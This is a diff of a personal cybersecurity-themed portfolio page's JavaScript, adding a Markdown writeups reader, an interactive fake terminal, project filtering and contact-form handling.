                     github: 'https://github.com/Anuraag-Mahapatra'
                 },
@@ -786,245 +1014,772 @@
                     categories: ['cybersecurity'],
                     badges: ['Cybersecurity'],
                     description:
-                        'Custom Python command-line directory brute-forcing and web enumeration tool built to streamline active reconnaissance workflows.',
+                        'Custom Python CLI directory enumeration and brute-forcing tool built to automate hidden endpoint discovery during web recon.',
                     tech: ['Python', 'Requests', 'Argparse', 'CLI'],
                     github: 'https://github.com/Anuraag-Mahapatra'
                 },
                 {
-                    title: 'OWASP Juice Shop Pentest Report',
-                    categories: ['cybersecurity'],
-                    badges: ['Cybersecurity'],
-                    description:
-                        'Comprehensive penetration testing assessment documenting vulnerable endpoints, step-by-step exploitation paths, impact analysis, and remediation guidance.',
-                    tech: ['Burp Suite', 'OWASP Top 10', 'Reporting'],
-                    github: 'https://github.com/Anuraag-Mahapatra'
-                },
-                {
-                    title: 'InAmigos Foundation Web & UX Audit',
+                    title: 'Personal Developer Portfolio',
                     categories: ['webdev'],
                     badges: ['Web Dev'],
                     description:
-                        'Responsive NGO awareness webpage, AI-generated web prototype, feature highlight modules, and a structured Figma UX improvement audit.',
-                    tech: ['HTML/CSS', 'JavaScript', 'Figma', 'UI/UX'],
+                        'Single-file dark cybersecurity portfolio featuring an interactive terminal card, filterable projects, and a read-only Markdown writeups hub.',
+                    tech: ['HTML5', 'Tailwind CSS', 'Vanilla JS', 'Markdown'],
                     github: 'https://github.com/Anuraag-Mahapatra'
                 },
                 {
-                    title: 'Bento Grid Service & Pricing Platform',
+                    title: 'InAmigos Foundation Web Deliverables',
                     categories: ['webdev'],
                     badges: ['Web Dev'],
                     description:
-                        'Modern multi-page web design utilizing a responsive Bento Grid layout to clearly present service capabilities and tiered pricing plans.',
-                    tech: ['HTML5', 'CSS Grid', 'Tailwind CSS', 'Responsive UI'],
+                        'Responsive NGO awareness webpage, AI-generated authenticated web app, and structured Figma UX improvement audit.',
+                    tech: ['HTML/CSS', 'JavaScript', 'Auth', 'Figma'],
                     github: 'https://github.com/Anuraag-Mahapatra'
                 }
             ];
 
-            /* ---------- 2. Toast Notification Helper ---------- */
-            let toastTimer = null;
-            function showToast(message) {
-                const toast = document.getElementById('toast');
-                const toastMessage = document.getElementById('toastMessage');
-                if (!toast || !toastMessage) return;
+            /* =========================================================================
+             *  UTILITIES: ESCAPING, TOAST, IFRAME-SAFE CLIPBOARD
+             * ========================================================================= */
+            function escapeHtml(str) {
+                return String(str)
+                    .replace(/&/g, '&amp;')
+                    .replace(/</g, '&lt;')
+                    .replace(/>/g, '&gt;')
+                    .replace(/"/g, '&quot;')
+                    .replace(/'/g, '&#39;');
+            }
 
-                toastMessage.textContent = message;
+            let toastTimer = null;
+            function showToast(msg) {
+                const toast = document.getElementById('toast');
+                const toastText = document.getElementById('toastText');
+                if (!toast || !toastText) return;
+                toastText.textContent = msg;
                 toast.classList.remove('opacity-0', 'translate-y-4', 'pointer-events-none');
                 toast.classList.add('opacity-100', 'translate-y-0');
-
                 clearTimeout(toastTimer);
                 toastTimer = setTimeout(() => {
                     toast.classList.remove('opacity-100', 'translate-y-0');
                     toast.classList.add('opacity-0', 'translate-y-4', 'pointer-events-none');
-                }, 3200);
+                }, 2800);
             }
 
-            /* ---------- 3. Render Projects & Category Filtering ---------- */
+            function copyToClipboard(text, successMsg) {
+                const ta = document.createElement('textarea');
+                ta.value = text;
+                ta.setAttribute('readonly', '');
+                ta.style.position = 'fixed';
+                ta.style.top = '-9999px';
+                ta.style.opacity = '0';
+                document.body.appendChild(ta);
+                ta.select();
+                try {
+                    const ok = document.execCommand('copy');
+                    showToast(ok ? successMsg : 'Unable to copy automatically.');
+                } catch (err) {
+                    showToast('Unable to copy automatically.');
+                }
+                document.body.removeChild(ta);
+            }
+
+            /* =========================================================================
+             *  SAFE LINEAR-TIME MARKDOWN PARSER (ZERO NESTED WHILE LOOPS)
+             *  Guaranteed O(N) termination — cannot freeze on any Markdown input.
+             * ========================================================================= */
+            function renderInline(rawText) {
+                // Step 1: Escape HTML entities first
+                let s = escapeHtml(rawText);
+
+                // Step 2: Protect inline `code` spans using placeholder tokens so
+                // underscores, quotes, and asterisks inside code are never mangled
+                const codeTokens = [];
+                s = s.replace(/\x60([^\x60]+)\x60/g, (_, inner) => {
+                    const idx = codeTokens.length;
+                    codeTokens.push('<code class="inline-code">' + inner + '</code>');
+                    return '\u0000CODE' + idx + '\u0000';
+                });
+
+                // Step 3: Inline images ![alt](src) — supports parentheses in filenames like Screenshot_(367).png
+                s = s.replace(/!\[([^\]]*)\]\(([^\s]+)\)/g, (_, alt, src) => {
+                    return '<img src="' + src + '" alt="' + alt + '" data-expected-path="' + src + '" class="md-proof-img my-3 rounded-lg border border-borderDark">';
+                });
+
+                // Step 4: Links [label](https://...)
+                s = s.replace(/\[([^\]]+)\]\((https?:\/\/[^\s)]+)\)/g, '<a href="$2" target="_blank" rel="noopener noreferrer">$1</a>');
+
+                // Step 5: Non-backtracking Bold **...** and Italic *...*
+                s = s.replace(/\*\*([^*]+)\*\*/g, '<strong>$1</strong>');
+                s = s.replace(/\*([^*]+)\*/g, '<em>$1</em>');
+
+                // Step 6: Restore protected inline code spans
+                s = s.replace(/\u0000CODE(\d+)\u0000/g, (_, idx) => codeTokens[Number(idx)]);
+
+                return s;
+            }
+
+            function renderMarkdownSafe(md) {
+                const lines = String(md || '').replace(/\r\n/g, '\n').split('\n');
+                const out = [];
+
+                let inCodeBlock = false;
+                let codeLang = 'CODE';
+                let codeLines = [];
+
+                let activeList = null; // 'ul' | 'ol' | null
+                let listItems = [];
+                let paraLines = [];
+
+                function flushParagraph() {
+                    if (paraLines.length > 0) {
+                        out.push('<p>' + renderInline(paraLines.join(' ')) + '</p>');
+                        paraLines = [];
+                    }
+                }
+
+                function flushList() {
+                    if (activeList && listItems.length > 0) {
+                        const tag = activeList;
+                        out.push('<' + tag + '>' + listItems.map(item => '<li>' + item + '</li>').join('') + '</' + tag + '>');
+                    }
+                    activeList = null;
+                    listItems = [];
+                }
+
+                function flushCodeBlock() {
+                    const rawCode = codeLines.join('\n');
+                    const encoded = encodeURIComponent(rawCode);
+                    out.push(
+                        '<div class="md-code-block">' +
+                            '<div class="md-code-header">' +
+                                '<span>' + escapeHtml(codeLang) + '</span>' +
+                                '<button type="button" data-copy-code="' + encoded + '" class="md-copy-btn rounded-md border border-borderDark bg-obsidian px-2.5 py-0.5 text-[11px] text-neonCyan transition hover:border-neonCyan hover:bg-neonCyan hover:text-obsidian">Copy</button>' +
+                            '</div>' +
+                            '<pre><code>' + escapeHtml(rawCode) + '</code></pre>' +
+                        '</div>'
+                    );
+                    inCodeBlock = false;
+                    codeLang = 'CODE';
+                    codeLines = [];
+                }
+
+                // Strictly linear single-pass loop
+                for (let i = 0; i < lines.length; i++) {
+                    const rawLine = lines[i];
+                    const trimmed = rawLine.trim();
+
+                    // 1. Handle fenced code block boundaries first
+                    if (trimmed.startsWith(FENCE)) {
+                        if (!inCodeBlock) {
+                            flushParagraph();
+                            flushList();
+                            inCodeBlock = true;
+                            const langText = trimmed.slice(3).trim();
+                            codeLang = langText ? langText.toUpperCase() : 'CODE';
+                            codeLines = [];
+                        } else {
+                            flushCodeBlock();
+                        }
+                        continue;
+                    }
+
+                    // 2. Inside a code block: push verbatim, NEVER run inline regexes
+                    if (inCodeBlock) {
+                        codeLines.push(rawLine);
+                        continue;
+                    }
+
+                    // 3. Blank line closes active paragraph / list
+                    if (trimmed === '') {
+                        flushParagraph();
+                        flushList();
+                        continue;
+                    }
+
+                    // 4. Horizontal rule
+                    if (/^(-{3,}|\*{3,}|_{3,})$/.test(trimmed)) {
+                        flushParagraph();
+                        flushList();
+                        out.push('<hr>');
+                        continue;
+                    }
+
+                    // 5. Headings (#, ##, ###)
+                    const hMatch = trimmed.match(/^(#{1,3})\s+(.+)$/);
+                    if (hMatch) {
+                        flushParagraph();
+                        flushList();
+                        const level = hMatch[1].length;
+                        out.push('<h' + level + '>' + renderInline(hMatch[2]) + '</h' + level + '>');
+                        continue;
+                    }
+
+                    // 6. Standalone Image: ![alt](path) — supports parentheses in path like Screenshot_(367).png
+                    const imgMatch = trimmed.match(/^!\[([^\]]*)\]\((.+)\)$/);
+                    if (imgMatch) {
+                        flushParagraph();
+                        flushList();
+                        const alt = imgMatch[1] || 'Proof Screenshot';
+                        const src = imgMatch[2].trim();
+                        out.push(
+                            '<figure class="md-figure">' +
+                                '<img src="' + escapeHtml(src) + '" alt="' + escapeHtml(alt) + '" data-expected-path="' + escapeHtml(src) + '" class="md-proof-img">' +
+                                '<figcaption>' +
+                                    '<span>' + escapeHtml(alt) + '</span>' +
+                                    '<span class="text-slate-500">' + escapeHtml(src) + '</span>' +
+                                '</figcaption>' +
+                            '</figure>'
+                        );
+                        continue;
+                    }
+
+                    // 7. Blockquote
+                    if (trimmed.startsWith('>')) {
+                        flushParagraph();
+                        flushList();
+                        out.push('<blockquote><p>' + renderInline(trimmed.replace(/^>\s?/, '')) + '</p></blockquote>');
+                        continue;
+                    }
+
+                    // 8. Unordered list item
+                    const ulMatch = trimmed.match(/^[-*+]\s+(.+)$/);
+                    if (ulMatch) {
+                        flushParagraph();
+                        if (activeList !== 'ul') {
+                            flushList();
+                            activeList = 'ul';
+                        }
+                        listItems.push(renderInline(ulMatch[1]));
+                        continue;
+                    }
+
+                    // 9. Ordered list item
+                    const olMatch = trimmed.match(/^\d+\.\s+(.+)$/);
+                    if (olMatch) {
+                        flushParagraph();
+                        if (activeList !== 'ol') {
+                            flushList();
+                            activeList = 'ol';
+                        }
+                        listItems.push(renderInline(olMatch[1]));
+                        continue;
+                    }
+
+                    // 10. Indented continuation line inside an active list (e.g., payload on next line under step 2)
+                    if (activeList && listItems.length > 0 && /^\s{2,}/.test(rawLine)) {
+                        listItems[listItems.length - 1] += '<br>' + renderInline(trimmed);
+                        continue;
+                    }
+
+                    // 11. Standard paragraph line
+                    flushList();
+                    paraLines.push(trimmed);
+                }
+
+                // Flush any remaining open state at EOF
+                if (inCodeBlock) flushCodeBlock();
+                flushParagraph();
+                flushList();
+
+                return out.join('\n');
+            }
+
+            /* =========================================================================
+             *  INTERACTIVE HERO TERMINAL
+             * ========================================================================= */
+            const termOutput = document.getElementById('termOutput');
+            const termForm = document.getElementById('termForm');
+            const termInput = document.getElementById('termInput');
+
+            const TERM_COMMANDS = {
+                help: 'Available commands: ./whoami, ./ctf_stats, ./contact, ls writeups, clear',
+                './whoami': 'Anuraag Mahapatra — B.Tech Electrical Engineering (3rd Yr / 5th Sem) @ OUTR, Bhubaneswar. Offensive Security Enthusiast, CTF Developer & Full-Stack Web Developer.',
+                whoami: 'anuraag (Offensive Security & CTF Developer @ OUTR)',
+                './ctf_stats': 'HackCTF 2026 Platform Builder (60 challenges, 7,100 pts) | OverTheWire Bandit: 33/33 Completed | PortSwigger Web Security Academy, TryHackMe & picoCTF.',
+                './contact': 'Email: a.mahapatra3000@gmail.com | GitHub: github.com/Anuraag-Mahapatra | LinkedIn: linkedin.com/in/anuraag-mahapatra-1033b933b',
+                'ls writeups': WRITEUPS.map(w => w.file + '  [' + w.severity + ' — ' + w.target + ']').join('\n')
+            };
+
+            function runTerminalCommand(rawCmd) {
+                const cmd = String(rawCmd || '').trim();
+                if (!cmd || !termOutput) return;
+
+                if (cmd.toLowerCase() === 'clear') {
+                    termOutput.innerHTML = '<p class="text-neonEmerald">Terminal cleared. Type <span class="text-neonCyan">help</span> for commands.</p>';
+                    return;
+                }
+
+                const response = TERM_COMMANDS[cmd.toLowerCase()] ||
+                    ('bash: ' + cmd + ': command not found. Type "help" for available commands.');
+
+                const entry = document.createElement('div');
+                entry.innerHTML =
+                    '<p><span class="text-neonEmerald">anuraag@sec</span>:<span class="text-neonCyan">~</span>$ <span class="text-white">' + escapeHtml(cmd) + '</span></p>' +
+                    '<p class="mt-1 whitespace-pre-wrap text-slate-300">' + escapeHtml(response) + '</p>';
+                termOutput.appendChild(entry);
+                termOutput.scrollTop = termOutput.scrollHeight;
+            }
+
+            document.querySelectorAll('.term-chip').forEach(chip => {
+                chip.addEventListener('click', () => {
+                    runTerminalCommand(chip.getAttribute('data-cmd'));
+                });
+            });
+
+            if (termForm && termInput) {
+                termForm.addEventListener('submit', e => {
+                    e.preventDefault();
+                    runTerminalCommand(termInput.value);
+                    termInput.value = '';
+                });
+            }
+
+            /* =========================================================================
+             *  PROJECTS GRID & CATEGORY FILTERING
+             * ========================================================================= */
             const projectsGrid = document.getElementById('projectsGrid');
             const filterBtns = document.querySelectorAll('.filter-btn');
 
             function renderProjects(filter) {
                 if (!projectsGrid) return;
-                const filtered = filter === 'all'
+                const list = filter === 'all'
                     ? PROJECTS
                     : PROJECTS.filter(p => p.categories.includes(filter));
 
-                projectsGrid.innerHTML = filtered.map(project => {
-                    const badgeHtml = project.badges.map(badge => {
-                        const isSec = badge === 'Cybersecurity';
-                        const cls = isSec
-                            ? 'border-cyberCyan/30 bg-cyberCyan/10 text-cyberCyan'
-                            : 'border-cyberEmerald/30 bg-cyberEmerald/10 text-cyberEmerald';
-                        return `<span class="rounded-md border px-2 py-0.5 font-mono text-[10px] font-semibold uppercase tracking-wider ${cls}">${badge}</span>`;
+                projectsGrid.innerHTML = list.map(project => {
+                    const badges = project.badges.map(b => {
+                        const cls = b === 'Cybersecurity'
+                            ? 'border-neonEmerald/35 bg-neonEmerald/10 text-neonEmerald'
+                            : 'border-neonCyan/35 bg-neonCyan/10 text-neonCyan';
+                        return '<span class="rounded-md border px-2 py-0.5 font-mono text-[10px] font-semibold uppercase tracking-wider ' + cls + '">' + escapeHtml(b) + '</span>';
                     }).join('');
 
-                    const techHtml = project.tech.map(t =>
-                        `<span class="rounded-md border border-slate-700/80 bg-obsidian/80 px-2.5 py-1 font-mono text-[11px] text-slate-300">${t}</span>`
+                    const tech = project.tech.map(t =>
+                        '<span class="rounded-md border border-borderDark bg-obsidian px-2.5 py-1 font-mono text-[11px] text-slate-300">' + escapeHtml(t) + '</span>'
                     ).join('');
 
-                    return `
-                        <article class="project-card glass-card flex flex-col justify-between rounded-2xl p-6">
-                            <div>
-                                <div class="mb-3 flex flex-wrap items-center justify-between gap-2">
-                                    <div class="flex flex-wrap gap-1.5">${badgeHtml}</div>
-                                    <a href="${project.github}" target="_blank" rel="noopener noreferrer" aria-label="View ${project.title} on GitHub"
-                                        class="text-slate-400 transition hover:text-cyberCyan">
-                                        <svg class="h-5 w-5" fill="currentColor" viewBox="0 0 24 24">
-                                            <path fill-rule="evenodd" clip-rule="evenodd"
-                                                d="M12 2C6.477 2 2 6.484 2 12.017c0 4.425 2.865 8.18 6.839 9.504.5.092.682-.217.682-.483 0-.237-.008-.868-.013-1.703-2.782.605-3.369-1.343-3.369-1.343-.454-1.158-1.11-1.466-1.11-1.466-.908-.62.069-.608.069-.608 1.003.07 1.53 1.032 1.53 1.032.892 1.53 2.341 1.088 2.91.832.092-.647.35-1.088.636-1.338-2.22-.253-4.555-1.113-4.555-4.951 0-1.093.39-1.988 1.029-2.688-.103-.253-.446-1.272.098-2.65 0 0 .84-.27 2.75 1.026A9.564 9.564 0 0112 6.844c.85.004 1.705.115 2.504.337 1.909-1.296 2.747-1.027 2.747-1.027.546 1.379.202 2.398.1 2.651.64.7 1.028 1.595 1.028 2.688 0 3.848-2.339 4.695-4.566 4.943.359.309.678.92.678 1.855 0 1.338-.012 2.419-.012 2.747 0 .268.18.58.688.482A10.019 10.019 0 0022 12.017C22 6.484 17.522 2 12 2z" />
-                                        </svg>
-                                    </a>
-                                </div>
-                                <h3 class="font-display text-lg font-bold text-white">${project.title}</h3>
-                                <p class="mt-2.5 text-sm leading-relaxed text-slate-300">${project.description}</p>
-                            </div>
-                            <div class="mt-5 border-t border-slate-800/80 pt-4">
-                                <div class="mb-4 flex flex-wrap gap-1.5">${techHtml}</div>
-                                <a href="${project.github}" target="_blank" rel="noopener noreferrer"
-                                    class="inline-flex items-center gap-1.5 font-mono text-xs font-semibold text-cyberCyan transition hover:text-cyberEmerald">
-                                    View on GitHub
-                                    <svg class="h-3.5 w-3.5" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
-                                        <path stroke-linecap="round" stroke-linejoin="round" d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14" />
-                                    </svg>
-                                </a>
-                            </div>
-                        </article>
-                    `;
+                    return (
+                        '<article class="cyber-panel hover-lift flex flex-col justify-between rounded-2xl p-6">' +
+                            '<div>' +
+                                '<div class="mb-3 flex items-center justify-between gap-2">' +
+                                    '<div class="flex flex-wrap gap-1.5">' + badges + '</div>' +
+                                    '<a href="' + project.github + '" target="_blank" rel="noopener noreferrer" aria-label="View ' + escapeHtml(project.title) + ' on GitHub" class="text-slate-400 transition hover:text-neonCyan">' +
+                                        '<svg class="h-5 w-5" fill="currentColor" viewBox="0 0 24 24">' +
+                                            '<path fill-rule="evenodd" clip-rule="evenodd" d="M12 2C6.477 2 2 6.484 2 12.017c0 4.425 2.865 8.18 6.839 9.504.5.092.682-.217.682-.483 0-.237-.008-.868-.013-1.703-2.782.605-3.369-1.343-3.369-1.343-.454-1.158-1.11-1.466-1.11-1.466-.908-.62.069-.608.069-.608 1.003.07 1.53 1.032 1.53 1.032.892 1.53 2.341 1.088 2.91.832.092-.647.35-1.088.636-1.338-2.22-.253-4.555-1.113-4.555-4.951 0-1.093.39-1.988 1.029-2.688-.103-.253-.446-1.272.098-2.65 0 0 .84-.27 2.75 1.026A9.564 9.564 0 0112 6.844c.85.004 1.705.115 2.504.337 1.909-1.296 2.747-1.027 2.747-1.027.546 1.379.202 2.398.1 2.651.64.7 1.028 1.595 1.028 2.688 0 3.848-2.339 4.695-4.566 4.943.359.309.678.92.678 1.855 0 1.338-.012 2.419-.012 2.747 0 .268.18.58.688.482A10.019 10.019 0 0022 12.017C22 6.484 17.522 2 12 2z" />' +
+                                        '</svg>' +
+                                    '</a>' +
+                                '</div>' +
+                                '<h3 class="text-lg font-bold text-white">' + escapeHtml(project.title) + '</h3>' +
+                                '<p class="mt-2.5 text-sm leading-relaxed text-slate-300">' + escapeHtml(project.description) + '</p>' +
+                            '</div>' +
+                            '<div class="mt-5 border-t border-borderDark pt-4">' +
+                                '<div class="flex flex-wrap gap-1.5">' + tech + '</div>' +
+                            '</div>' +
+                        '</article>'
+                    );
                 }).join('');
             }
 
             filterBtns.forEach(btn => {
                 btn.addEventListener('click', () => {
-                    const selected = btn.getAttribute('data-filter');
+                    const filter = btn.getAttribute('data-filter');
                     filterBtns.forEach(b => {
-                        b.classList.remove('bg-cyberCyan', 'text-obsidian', 'font-bold');
-                        b.classList.add('text-slate-300', 'font-semibold');
-                        b.setAttribute('aria-selected', 'false');
+                        const active = b === btn;
+                        b.setAttribute('aria-selected', String(active));
+                        b.className = active
+                            ? 'filter-btn rounded-lg bg-neonEmerald px-4 py-2 font-mono text-xs font-bold text-obsidian transition'
+                            : 'filter-btn rounded-lg px-4 py-2 font-mono text-xs font-semibold text-slate-300 transition hover:text-neonEmerald';
                     });
-                    btn.classList.add('bg-cyberCyan', 'text-obsidian', 'font-bold');
-                    btn.classList.remove('text-slate-300', 'font-semibold');
-                    btn.setAttribute('aria-selected', 'true');
-                    renderProjects(selected);
+                    renderProjects(filter);
                 });
             });
 
             renderProjects('all');
 
-            /* ---------- 4. Interactive Hero Terminal Commands ---------- */
-            const termExtraOutput = document.getElementById('termExtraOutput');
-            const termCmdResponses = {
-                whoami: 'uid=1337(anuraag) gid=1337(outr_ee) groups=offensive_sec,ctf_dev,mern_stack',
-                ctf: 'HackCTF (60 challenges / 7,100 pts) | OverTheWire Bandit (33/33) | PortSwigger & TryHackMe Active',
-                contact: 'Email: a.mahapatra3000@gmail.com | GitHub: @Anuraag-Mahapatra | Location: Bhubaneswar, IN'
-            };
-
-            document.querySelectorAll('.term-cmd-btn').forEach(btn => {
-                btn.addEventListener('click', () => {
-                    const cmd = btn.getAttribute('data-cmd');
-                    if (!termExtraOutput || !termCmdResponses[cmd]) return;
-                    termExtraOutput.classList.remove('hidden');
-                    termExtraOutput.innerHTML = `<span class="text-cyberEmerald">&gt; ./${cmd}</span><br><span class="text-slate-200">${termCmdResponses[cmd]}</span>`;
-                });
-            });
-
-            /* ---------- 5. Copy Email to Clipboard (iframe-safe) ---------- */
+            /* =========================================================================
+             *  CONTACT SECTION INTERACTIONS
+             * ========================================================================= */
             const copyEmailBtn = document.getElementById('copyEmailBtn');
             if (copyEmailBtn) {
                 copyEmailBtn.addEventListener('click', () => {
-                    const email = 'a.mahapatra3000@gmail.com';
-                    try {
-                        const tempInput = document.createElement('textarea');
-                        tempInput.value = email;
-                        tempInput.style.position = 'fixed';
-                        tempInput.style.opacity = '0';
-                        document.body.appendChild(tempInput);
-                        tempInput.select();
-                        document.execCommand('copy');
-                        document.body.removeChild(tempInput);
-
-                        copyEmailBtn.textContent = 'Copied!';
-                        showToast('Email copied to clipboard');
-                        setTimeout(() => {
-                            copyEmailBtn.textContent = 'Copy';
-                        }, 2000);
-                    } catch (err) {
-                        showToast('Email: ' + email);
-                    }
+                    copyToClipboard('a.mahapatra3000@gmail.com', 'Email copied to clipboard!');
                 });
             }
 
-            /* ---------- 6. Contact Form Validation & Mailto Trigger ---------- */
             const contactForm = document.getElementById('contactForm');
-            const formError = document.getElementById('formError');
-
-            if (contactForm) {
-                contactForm.addEventListener('submit', (e) => {
+            const contactError = document.getElementById('contactError');
+            if (contactForm && contactError) {
+                contactForm.addEventListener('submit', e => {
                     e.preventDefault();
-                    const name = document.getElementById('senderName').value.trim();
-                    const email = document.getElementById('senderEmail').value.trim();
-                    const subject = document.getElementById('senderSubject').value.trim();
-                    const message = document.getElementById('senderMessage').value.trim();
+                    const name = document.getElementById('cName').value.trim();
+                    const email = document.getElementById('cEmail').value.trim();
+                    const message = document.getElementById('cMessage').value.trim();
 
-                    const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-                    if (!name || !email || !subject || !message) {
-                        formError.textContent = '> Error: Please fill out all required fields.';
-                        formError.classList.remove('hidden');
+                    if (!name || !email || !message) {
+                        contactError.textContent = '> Please fill in your name, email, and message.';
+                        contactError.classList.remove('hidden');
                         return;
                     }
-                    if (!emailPattern.test(email)) {
-                        formError.textContent = '> Error: Please enter a valid email address.';
-                        formError.classList.remove('hidden');
+                    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+                        contactError.textContent = '> Please enter a valid email address.';
+                        contactError.classList.remove('hidden');
                         return;
                     }
+                    contactError.classList.add('hidden');
 
-                    formError.classList.add('hidden');
-                    const body = `Hi Anuraag,\n\n${message}\n\nBest regards,\n${name}\n(${email})`;
-                    const mailtoUrl = `mailto:a.mahapatra3000@gmail.com?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
-
-                    window.location.href = mailtoUrl;
-                    showToast('Email draft prepared! Ready to send.');
+                    const subject = 'Portfolio Contact from ' + name;
+                    const body = 'Name: ' + name + '\nEmail: ' + email + '\n\n' + message;
+                    window.location.href = 'mailto:a.mahapatra3000@gmail.com?subject=' + encodeURIComponent(subject) + '&body=' + encodeURIComponent(body);
+                    showToast('Opening your email client with a pre-filled draft...');
                     contactForm.reset();
                 });
             }
 
-            /* ---------- 7. Mobile Navigation Toggle ---------- */
+            /* =========================================================================
+             *  READ-ONLY WRITEUPS HUB & SAFE DETAIL READER
+             * ========================================================================= */
+            let activeCategory = 'All';
+            let activeSeverity = 'All';
+            let searchQuery = '';
+            let currentWriteup = null;
+
+            const navBadge = document.getElementById('navWriteupCount');
+            const mobBadge = document.getElementById('mobileWriteupCount');
+            if (navBadge) navBadge.textContent = String(WRITEUPS.length);
+            if (mobBadge) mobBadge.textContent = String(WRITEUPS.length);
+
+            function severityBadgeStyle(sev) {
+                const s = String(sev || '').toLowerCase();
+                if (s.includes('critical') || s.includes('p1')) return 'border-rose-500/45 bg-rose-500/15 text-rose-400';
+                if (s.includes('high') || s.includes('p2')) return 'border-orange-500/45 bg-orange-500/15 text-orange-400';
+                if (s.includes('medium') || s.includes('p3')) return 'border-amber-400/45 bg-amber-400/15 text-amber-300';
+                if (s.includes('low') || s.includes('p4')) return 'border-neonEmerald/45 bg-neonEmerald/15 text-neonEmerald';
+                return 'border-neonCyan/45 bg-neonCyan/15 text-neonCyan';
+            }
+
+            function renderWriteupFilterPills() {
+                const catContainer = document.getElementById('writeupCategoryFilters');
+                const sevContainer = document.getElementById('writeupSeverityFilters');
+                if (!catContainer || !sevContainer) return;
+
+                const categories = ['All', ...Array.from(new Set(WRITEUPS.map(w => w.category)))];
+                const severities = ['All', ...Array.from(new Set(WRITEUPS.map(w => w.severity)))];
+
+                catContainer.innerHTML =
+                    '<span class="mr-1 font-mono text-[11px] uppercase tracking-wider text-slate-400">Category:</span>' +
+                    categories.map(cat => {
+                        const on = cat === activeCategory;
+                        const cls = on
+                            ? 'rounded-lg bg-neonCyan px-3 py-1.5 font-mono text-xs font-bold text-obsidian transition'
+                            : 'rounded-lg border border-borderDark bg-panel px-3 py-1.5 font-mono text-xs font-medium text-slate-300 transition hover:border-neonCyan hover:text-neonCyan';
+                        return '<button type="button" data-cat="' + escapeHtml(cat) + '" class="' + cls + '">' + escapeHtml(cat) + '</button>';
+                    }).join('');
+
+                sevContainer.innerHTML =
+                    '<span class="mr-1 font-mono text-[11px] uppercase tracking-wider text-slate-400">Severity:</span>' +
+                    severities.map(sev => {
+                        const on = sev === activeSeverity;
+                        const cls = on
+                            ? 'rounded-lg bg-rose-500 px-3 py-1.5 font-mono text-xs font-bold text-white transition'
+                            : 'rounded-lg border border-borderDark bg-panel px-3 py-1.5 font-mono text-xs font-medium text-slate-300 transition hover:border-rose-400 hover:text-rose-400';
+                        return '<button type="button" data-sev="' + escapeHtml(sev) + '" class="' + cls + '">' + escapeHtml(sev) + '</button>';
+                    }).join('');
+
+                catContainer.querySelectorAll('button').forEach(btn => {
+                    btn.addEventListener('click', () => {
+                        activeCategory = btn.getAttribute('data-cat');
+                        renderWriteupFilterPills();
+                        renderWriteupsHub();
+                    });
+                });
+
+                sevContainer.querySelectorAll('button').forEach(btn => {
+                    btn.addEventListener('click', () => {
+                        activeSeverity = btn.getAttribute('data-sev');
+                        renderWriteupFilterPills();
+                        renderWriteupsHub();
+                    });
+                });
+            }
+
+            function renderWriteupsHub() {
+                const grid = document.getElementById('writeupsGrid');
+                const empty = document.getElementById('writeupsEmpty');
+                if (!grid || !empty) return;
+
+                const q = searchQuery.toLowerCase();
+                const filtered = WRITEUPS.filter(w => {
+                    const catMatch = activeCategory === 'All' || w.category === activeCategory;
+                    const sevMatch = activeSeverity === 'All' || w.severity === activeSeverity;
+                    const textBlob = [w.title, w.target, w.category, w.severity, w.cwe, w.summary, (w.tags || []).join(' ')].join(' ').toLowerCase();
+                    const qMatch = !q || textBlob.includes(q);
+                    return catMatch && sevMatch && qMatch;
+                });
+
+                if (!filtered.length) {
+                    grid.innerHTML = '';
+                    empty.classList.remove('hidden');
+                    return;
+                }
+
+                empty.classList.add('hidden');
+                grid.innerHTML = filtered.map(w => {
+                    const cwePills = String(w.cwe || '').split(',').map(c => c.trim()).filter(Boolean).map(c =>
+                        '<span class="rounded-md border border-amber-400/35 bg-amber-400/10 px-2 py-0.5 font-mono text-[11px] font-medium text-amber-300">' + escapeHtml(c) + '</span>'
+                    ).join('');
+
+                    return (
+                        '<article class="cyber-panel hover-lift rounded-2xl p-6 sm:p-7">' +
+                            '<div class="flex flex-wrap items-center justify-between gap-3">' +
+                                '<div class="flex flex-wrap items-center gap-2">' +
+                                    '<span class="rounded-md border px-2.5 py-0.5 font-mono text-xs font-bold uppercase tracking-wider ' + severityBadgeStyle(w.severity) + '">' + escapeHtml(w.severity) + '</span>' +
+                                    '<span class="rounded-md border border-neonCyan/30 bg-neonCyan/10 px-2.5 py-0.5 font-mono text-xs text-neonCyan">' + escapeHtml(w.category) + '</span>' +
+                                '</div>' +
+                                '<span class="font-mono text-xs text-slate-400">' + escapeHtml(w.date) + ' &middot; Target: <strong class="text-slate-200">' + escapeHtml(w.target) + '</strong></span>' +
+                            '</div>' +
+
+                            '<h2 class="mt-4 text-xl font-bold text-white sm:text-2xl">' + escapeHtml(w.title) + '</h2>' +
+                            '<p class="mt-2.5 text-sm leading-relaxed text-slate-300">' + escapeHtml(w.summary) + '</p>' +
+
+                            '<div class="mt-5 flex flex-wrap items-center justify-between gap-4 border-t border-borderDark pt-4">' +
+                                '<div class="flex flex-wrap items-center gap-2">' + cwePills + '</div>' +
+                                '<button type="button" data-open-writeup="' + escapeHtml(w.id) + '" class="open-writeup-btn inline-flex items-center gap-1.5 rounded-xl border border-neonEmerald/40 bg-neonEmerald/15 px-4 py-2 font-mono text-xs font-bold text-neonEmerald transition hover:bg-neonEmerald hover:text-obsidian">' +
+                                    'Read Full Report &rarr;' +
+                                '</button>' +
+                            '</div>' +
+                        '</article>'
+                    );
+                }).join('');
+
+                grid.querySelectorAll('.open-writeup-btn').forEach(btn => {
+                    btn.addEventListener('click', () => {
+                        const id = btn.getAttribute('data-open-writeup');
+                        navigateToHash('#writeups/' + encodeURIComponent(id));
+                    });
+                });
+            }
+
+            function openWriteup(slug) {
+                const w = WRITEUPS.find(item => item.id === slug);
+                const hub = document.getElementById('writeupsHub');
+                const reader = document.getElementById('writeupReader');
+
+                if (!w || !hub || !reader) {
+                    if (hub) hub.classList.remove('hidden');
+                    if (reader) reader.classList.add('hidden');
+                    renderWriteupFilterPills();
+                    renderWriteupsHub();
+                    return;
+                }
+
+                currentWriteup = w;
+                hub.classList.add('hidden');
+                reader.classList.remove('hidden');
+
